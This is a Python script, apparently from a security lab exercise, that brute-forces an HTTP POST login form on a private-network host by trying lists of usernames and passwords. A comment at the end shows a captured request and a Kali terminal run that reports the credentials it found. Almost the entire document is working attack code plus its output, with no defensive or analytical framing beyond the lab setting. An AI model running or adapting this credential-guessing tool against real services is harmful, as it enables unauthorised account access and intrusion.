#!/usr/bin/env python3 -tt
import requests
'''
	Program used to dictionary attack username and password on a http POST web service.
	This program can easily be modified to accept file names for users, passwords and URLs.
'''
def main():

	url=r'http://192.168.1.161/security/3/php/index.php'
	users= ['user','admin','root'] #username test data
	passwds=['root','admin','god','ilovecomputersecurity','rOOt','r00t'] #password test data

	sesh=requests.session()
	#count=0
	
	for user in users:
		
		for passwd in passwds:
			
			postdata={'login_field': user,'password_field': passwd,'go_field':'Login'}
			resp=sesh.post(url,postdata) # make the post request
			
			if 'Error' not in resp.content.decode(): # no idea what a valid login looks like
				
				print(resp.content.decode())
				print('User and password found!')
				print('User: {}, Pass: {}'.format(user,passwd))
				exit()
			#else: 
				#print("Tried {} combinations".format(count))
				#count+=1			

if __name__=='__main__':
	main()

'''

POST /security/3/php/index.php HTTP/1.1
Host: 192.168.1.161
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.1.161/security/3/php/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

login_field=admin&password_field=ro&go_field=Login

%%%%%%%%%%%%%%%%%  Usage  %%%%%%%%%%%%%%%%%
root@kali:~/scripts/PythonScripts# python3 posthttp.py 

<html>
<head>
	<title>PHP Form Auth</title>
</head>
<body>
	Logged in</body>
User and password found!
User: admin, Pass: r00t
root@kali:~/scripts/PythonScripts# 

'''